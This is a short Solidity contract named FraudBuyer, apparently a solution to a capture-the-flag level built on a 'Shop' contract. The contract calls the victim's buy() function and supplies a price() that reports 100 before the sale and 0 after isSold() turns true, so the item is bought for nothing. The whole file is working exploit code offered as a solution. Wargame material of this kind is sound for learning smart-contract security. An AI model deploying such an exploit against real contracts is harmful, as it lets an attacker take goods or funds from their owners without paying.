// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../lv21_shop.sol';

contract FraudBuyer {
    Shop public shopAddress;
    constructor(address victimAddress) {
        shopAddress = Shop(victimAddress);
    } 
    
    function exploit() public {
        shopAddress.buy();
    }

    function price() public view returns (uint256) {
        if ( shopAddress.isSold() == true){
            return 100;
        } else {
            return 0;
        }
    }
}
